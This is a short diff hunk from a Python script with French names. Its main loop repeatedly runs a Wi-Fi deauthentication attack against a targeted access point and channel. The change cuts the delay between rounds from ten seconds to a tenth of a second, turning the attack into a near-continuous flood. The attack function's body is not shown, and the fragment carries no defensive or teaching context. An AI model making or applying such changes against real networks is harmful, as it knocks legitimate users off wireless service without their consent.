@@ -17,4 +17,4 @@ def attaque_deauth(bssid, canal):
 # Boucle principale
 while True:
     attaque_deauth(BSSID_CIBLE, CANAL_CIBLE)
-    time.sleep(10)
+    time.sleep(0.1)
